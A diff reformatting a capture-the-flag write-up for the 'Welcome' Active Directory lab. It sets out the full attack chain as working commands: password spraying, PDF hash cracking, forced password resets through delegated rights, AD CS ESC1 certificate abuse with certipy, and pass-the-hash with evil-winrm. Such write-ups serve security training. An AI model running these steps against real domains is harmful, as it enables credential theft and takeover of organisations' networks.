@@ -1,18 +1,20 @@
 # Welcome
 
-![image.png](Welcome/image.png)
+## Welcome
 
-# Objective / Scope
+![image.png](<../.gitbook/assets/image (7).png>)
+
+## Objective / Scope
 
 You are a member of the Hack Smarter Red Team. During a phishing engagement, you were able to retrieve credentials for the client's Active Directory environment. Use these credentials to enumerate the environment, elevate your privileges, and demonstrate impact for the client.
 
-### Starting Credentials
+#### Starting Credentials
 
 ```bash
 e.hills:Il0vemyj0b2025!
 ```
 
-## RECON
+### RECON
 
 Rustscan
 
@@ -146,26 +148,25 @@ PORT      STATE SERVICE       REASON          VERSION
 
 ```
 
-- The  RustScan we identify a Windows host named `DC01` on domain `WELCOME.local` exposing DNS on `53`, Kerberos on `88`
-- We can start our initial enum with testing the creds that we were presented with `e.hills:Il0vemyj0b2025!` for shares
-- Added  `DC01.WELCOME.local WELCOME.local` to my `/etc/hosts`
+* The RustScan we identify a Windows host named `DC01` on domain `WELCOME.local` exposing DNS on `53`, Kerberos on `88`
+* We can start our initial enum with testing the creds that we were presented with `e.hills:Il0vemyj0b2025!` for shares
+* Added `DC01.WELCOME.local WELCOME.local` to my `/etc/hosts`
 
-### Initial access with `e.hills:Il0vemyj0b2025!`
+#### Initial access with `e.hills:Il0vemyj0b2025!`
 
-- Testing to see if our creds are valid or not
-    
+*   Testing to see if our creds are valid or not
+
     ```bash
     RedBlue@Frank Welcome % nxc smb welcome.local -u e.hills -p 'Il0vemyj0b2025!' --shares
-    
+
     ```
-    
 
-![image.png](Welcome/image%201.png)
+![image.png](<../.gitbook/assets/image 1 (6).png>)
 
-- There is an interesting share `Human Resources` with `Read` permissions and we need to see whats inside.
-- Before we dive into the share, usually as a best practice when `IPC$` has also read permissions, always  perform a `RID brute force` to enumerate additional users.
+* There is an interesting share `Human Resources` with `Read` permissions and we need to see whats inside.
+* Before we dive into the share, usually as a best practice when `IPC$` has also read permissions, always perform a `RID brute force` to enumerate additional users.
 
-### Enumerating other users
+#### Enumerating other users
 
 ```bash
 RedBlue@Frank Welcome % nxc smb welcome.local -u 'e.hills' -p 'Il0vemyj0b2025!' --rid-brute | grep 'SidTypeUser'
@@ -184,49 +185,46 @@ SMB                      10.1.205.139    445    DC01             1114: WELCOME\s
 
 ```
 
-![image.png](Welcome/image%202.png)
+![image.png](<../.gitbook/assets/image 2 (6).png>)
 
-- We are able to obtain some users and we them to `users.txt`.
-- We can also use `awk [options] 'pattern {action}' input-file > output-file` to filter only names.
-    
+* We are able to obtain some users and we them to `users.txt`.
+*   We can also use `awk [options] 'pattern {action}' input-file > output-file` to filter only names.
+
     ```bash
     awk '{print $6}' names.txt | sed 's/WELCOME\\//' > users.txt
-    
+
     ```
-    
 
-![image.png](Welcome/image%203.png)
+![image.png](<../.gitbook/assets/image 3 (6).png>)
 
-- Now that there is a user list and a password, let's try a `password spray for password reuse`
-    
+*   Now that there is a user list and a password, let's try a `password spray for password reuse`
+
     ```bash
     nxc smb  10.1.205.139 -u users.txt -p 'Il0vemyj0b2025!' --continue-on-success
     ```
-    
 
-![image.png](Welcome/image%204.png)
+![image.png](<../.gitbook/assets/image 4 (6).png>)
 
-- No luck here. Only the `e.hills` user uses that password.
+* No luck here. Only the `e.hills` user uses that password.
 
-### Enumerating the `Human Resource share`
+#### Enumerating the `Human Resource share`
 
-![image.png](Welcome/image%205.png)
+![image.png](<../.gitbook/assets/image 5 (6).png>)
 
-- We used smbclient to connect to the share and there are some interesting documents that we need to look into.
-- We get download all of them by `mget *`
-    
-    ![image.png](Welcome/image%206.png)
-    
-- Using `firefox Welcome*` to read the files
-- We retrieved  `hr@welcome.local`
+* We used smbclient to connect to the share and there are some interesting documents that we need to look into.
+*   We get download all of them by `mget *`
+
+    ![image.png](<../.gitbook/assets/image 6 (6).png>)
+* Using `firefox Welcome*` to read the files
+* We retrieved `hr@welcome.local`
 
 There is a document is password protected and we need to find a way to view the contents of the file.
 
-### Enumerating the password protected pdf
+#### Enumerating the password protected pdf
 
-![image.png](Welcome/image%207.png)
+![image.png](<../.gitbook/assets/image 7 (6).png>)
 
-### Cracking password-protected document - `Welcome Start Guide`
+#### Cracking password-protected document - `Welcome Start Guide`
 
 ```bash
 RedBlue@Frank Welcome % pdf2john "Welcome Start Guide.pdf" > pdf.hash
@@ -245,31 +243,31 @@ RedBlue@Frank Welcome %
 
 ```
 
-![image.png](Welcome/image%208.png)
+![image.png](<../.gitbook/assets/image 8 (6).png>)
 
-- We have managed to crack the hash and the password is `humanresources` and this could be potentially the password for the  `hr@welcome.local` that we found early on.
-- We obtained the below interesting findings
+* We have managed to crack the hash and the password is `humanresources` and this could be potentially the password for the `hr@welcome.local` that we found early on.
+* We obtained the below interesting findings
 
-![image.png](Welcome/image%209.png)
+![image.png](<../.gitbook/assets/image 9 (6).png>)
 
-![image.png](Welcome/image%2010.png)
+![image.png](<../.gitbook/assets/image 10 (6).png>)
 
-![image.png](Welcome/image%2011.png)
+![image.png](<../.gitbook/assets/image 11 (6).png>)
 
 Findings
 
-- Service Accounts
-- Password `Welcome2025@!` Can be used to password spray our users.txt
+* Service Accounts
+* Password `Welcome2025@!` Can be used to password spray our users.txt
 
 ```bash
 nxc smb  10.1.205.139 -u users.txt -p 'Welcome2025!@' --continue-on-success
 ```
 
-![image.png](Welcome/image%2012.png)
+![image.png](<../.gitbook/assets/image 12 (6).png>)
 
-- User `a.harris` uses the password `Welcome2025!@`
+* User `a.harris` uses the password `Welcome2025!@`
 
-## Bloodhound
+### Bloodhound
 
 We can use bloodhound for a user friendly view and enumeration and we have too collect the loot as follows. We can either use a.harris and or e.hills creds.
 
@@ -277,44 +275,43 @@ We can use bloodhound for a user friendly view and enumeration and we have too c
 nxc ldap DC01.WELCOME.local -u 'a.harris' -p 'Welcome2025!@' --bloodhound --collection All --dns-server 10.1.205.139
 ```
 
-![image.png](Welcome/image%2013.png)
+![image.png](<../.gitbook/assets/image 13 (6).png>)
 
-### Bloodhound Enum and Recon
+#### Bloodhound Enum and Recon
 
-![image.png](Welcome/image%2014.png)
+![image.png](<../.gitbook/assets/image 14 (6).png>)
 
-- User `e.hills` has no interesting groups
-- Lets look at another compromised user `a.harris`
+* User `e.hills` has no interesting groups
+* Lets look at another compromised user `a.harris`
 
-![image.png](Welcome/image%2015.png)
+![image.png](<../.gitbook/assets/image 15 (5).png>)
 
-- a.harris is a memmber of `Remote management users & Hr`
+* a.harris is a memmber of `Remote management users & Hr`
 
-![image.png](Welcome/image%2016.png)
+![image.png](<../.gitbook/assets/image 16 (5).png>)
 
-- Another interesting thing is that, a.harris is a member of `Hr` which has `GenericAll`  Over a `I.Park`
+* Another interesting thing is that, a.harris is a member of `Hr` which has `GenericAll` Over a `I.Park`
 
-![image.png](Welcome/image%2017.png)
+![image.png](<../.gitbook/assets/image 17 (5).png>)
 
-![image.png](Welcome/image%2018.png)
+![image.png](<../.gitbook/assets/image 18 (5).png>)
 
-- `i.park` is a member of some interesting groups, `IT & Helpdesk`
-- `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
-- The most interesting on for me is the service with a CA Certficicate Authority..We shall check that with Certipy
+* `i.park` is a member of some interesting groups, `IT & Helpdesk`
+* `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
+* The most interesting on for me is the service with a CA Certficicate Authority..We shall check that with Certipy
 
-## Mapping our Attack vector
+### Mapping our Attack vector
 
-- We can `rdp` with `a.harris:Welcome2025!@` and hopefully will get our initail access and potentially our user flag
-- `a.harris` have GenericAll permissions to the user `I.PARK@WELCOME.LOCAL`.This is also known as full control. This permission allows the trustee to manipulate the target object however they wish. In this case i will apply the force change password with `net rpc`
-    
+* We can `rdp` with `a.harris:Welcome2025!@` and hopefully will get our initail access and potentially our user flag
+*   `a.harris` have GenericAll permissions to the user `I.PARK@WELCOME.LOCAL`.This is also known as full control. This permission allows the trustee to manipulate the target object however they wish. In this case i will apply the force change password with `net rpc`
+
     ```bash
     net rpc password "i.park" "RedBlue!@7" -U "Welcome.local"/"a.harris"%"Welcome2025!@" -S "10.1.205.139"
     ```
-    
-- `i.park` is a member of some interesting groups, `IT & Helpdesk` , `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
-- Enumerate and abusing Active Directory Certificate Services (AD CS).
+* `i.park` is a member of some interesting groups, `IT & Helpdesk` , `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
+* Enumerate and abusing Active Directory Certificate Services (AD CS).
 
-## Compromising I.PARK
+### Compromising I.PARK
 
 ```bash
 net rpc password 'i.park' 'RedBlue!@7' -U 'Welcome.local'/'a.harris'%'Welcome2025!@' -S 10.1.205.139
@@ -331,34 +328,34 @@ RedBlue@Frank Welcome %
 
 ```
 
-![image.png](Welcome/image%2019.png)
+![image.png](<../.gitbook/assets/image 19 (5).png>)
 
-## Compromising SVC-CA
+### Compromising SVC-CA
 
-- `i.park` is a member of some interesting groups, `IT & Helpdesk` , `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
-- We need to change a password of the `SVC_CA` account and then check if its certificates are vulnerable.
-- **ADMINISTRATORS@WELCOME.LOCAL has `GenericAll`  over helpdesk**
+* `i.park` is a member of some interesting groups, `IT & Helpdesk` , `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
+* We need to change a password of the `SVC_CA` account and then check if its certificates are vulnerable.
+* **ADMINISTRATORS@WELCOME.LOCAL has `GenericAll` over helpdesk**
 
-![image.png](Welcome/image%2020.png)
+![image.png](<../.gitbook/assets/image 20 (5).png>)
 
-![image.png](Welcome/image%2021.png)
+![image.png](<../.gitbook/assets/image 21 (5).png>)
 
 ```bash
 net rpc password 'SVC_CA' 'RedBlue!@7' -U 'Welcome.local'/'i.park'%'RedBlue!@7' -S 10.1.205.139
 ```
 
-### Check for vulnerable certs
+#### Check for vulnerable certs
 
 ```bash
 certipy-ad find -u 'SVC_CA@Welcome.local' -p 'RedBlue!@7' -dc-ip 10.1.205.139
 
 ```
 
-![image.png](Welcome/image%2022.png)
+![image.png](<../.gitbook/assets/image 22 (5).png>)
 
-![image.png](Welcome/image%2023.png)
+![image.png](<../.gitbook/assets/image 23 (5).png>)
 
-- svc_ca is vulnerable to `ESC1: Enrollee-Supplied Subject for Client Authentication`
+* svc\_ca is vulnerable to `ESC1: Enrollee-Supplied Subject for Client Authentication`
 
 Exploiting an ESC1 vulnerability typically involves two main steps:
 
@@ -388,34 +385,33 @@ certipy account -u 'SVC_CA' -p 'RedBlue!@7' -dc-ip '10.1.205.139' -user 'adminis
 
 ```
 
-![image.png](Welcome/image%2024.png)
+![image.png](<../.gitbook/assets/image 24 (5).png>)
 
-![image.png](Welcome/image%2025.png)
+![image.png](<../.gitbook/assets/image 25 (5).png>)
 
-- The output confirms that a certificate was issued
-- The attacker now uses the generated `administrator.pfx` file with certipy auth to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.
+* The output confirms that a certificate was issued
+* The attacker now uses the generated `administrator.pfx` file with certipy auth to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.
 
 ```bash
 certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.1.205.139'
 ```
 
-![image.png](Welcome/image%2026.png)
+![image.png](<../.gitbook/assets/image 26 (5).png>)
 
-- Successful authentication results in a Kerberos TGT for the administrator account (saved to administrator.ccache), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as administrator within the domain.
-- We can attempt to authenticate with `pass the hash`
-    
+* Successful authentication results in a Kerberos TGT for the administrator account (saved to administrator.ccache), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as administrator within the domain.
+*   We can attempt to authenticate with `pass the hash`
+
     ```bash
     evil-winrm -i 10.1.205.139 -u administrator -H :0cf1b799460a39c852068b7c0574677a 
     ```
-    
 
-![image.png](Welcome/image%2027.png)
+![image.png](<../.gitbook/assets/image 27 (5).png>)
 
-- We are now an administrator
+* We are now an administrator
 
-## FLAGS
+### FLAGS
 
-Use the below to search and type in the flag. Change the  `'*flag.txt'` in the format that the flags are in..In this instance i can use `root.txt` or `user.txt`
+Use the below to search and type in the flag. Change the `'*flag.txt'` in the format that the flags are in..In this instance i can use `root.txt` or `user.txt`
 
 ```bash
 gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
@@ -423,8 +419,8 @@ gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "
 
 User- flag
 
-![image.png](Welcome/image%2028.png)
+![image.png](<../.gitbook/assets/image 28 (5).png>)
 
 Root - Flag
 
-![image.png](Welcome/image%2029.png)
+![image.png](<../.gitbook/assets/image 29 (5).png>)
